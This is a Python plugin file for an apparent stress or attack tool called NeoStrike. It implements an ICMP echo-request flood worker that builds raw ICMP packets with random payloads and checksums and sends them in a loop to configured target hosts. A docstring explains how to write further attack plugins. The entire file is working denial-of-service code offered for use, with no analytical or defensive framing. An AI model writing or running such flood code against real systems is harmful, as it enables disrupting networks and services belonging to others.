#!/usr/bin/env python3
"""
Example NeoStrike Plugin - ICMP Flood

To create your own plugin:
1. Create a .py file in the plugins/ directory
2. Define PLUGIN_INFO dict with: name, description, methods
3. Implement a worker_fn(cfg, stats, stopper, logger) function
"""

PLUGIN_INFO = {
    "name": "ICMP",
    "description": "ICMP ping flood (requires raw socket / admin)",
    "methods": ["ICMP"],
}

import socket
import random
import time
import struct


def worker_fn(cfg, stats, stopper, logger):
    """ICMP echo request flood worker."""
    icmp_type = 8  # Echo request
    icmp_code = 0

    target_idx = random.randrange(len(cfg.targets))

    while not stopper.stopped:
        target = cfg.targets[target_idx % len(cfg.targets)]
        target_idx += 1
        host = target.ip or target.host

        with stats.lock:
            if cfg.request_target and stats.sent >= cfg.request_target:
                return
            stats.sent += 1
            stats.active += 1

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            # Build ICMP echo request
            ident = random.randint(0, 65535)
            seq = random.randint(0, 65535)
            header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, ident, seq)
            payload = random.randbytes(64)
            checksum = _icmp_checksum(header + payload)
            header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, ident, seq)
            s.sendto(header + payload, (host, 0))
            stats.record(True, "ICMP_OK", len(payload), note="ICMP echo sent")
            s.close()
        except PermissionError:
            stats.record(False, "PERM_ERR", note="need admin/root")
            logger.error("ICMP requires admin privileges")
            return
        except Exception as exc:
            stats.record(False, "ICMP_ERR", note=str(exc))
            logger.error("ICMP error: %s", exc)
        finally:
            with stats.lock:
                stats.active -= 1


def _icmp_checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i + 1] if i + 1 < len(data) else 0)
        s += w
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF
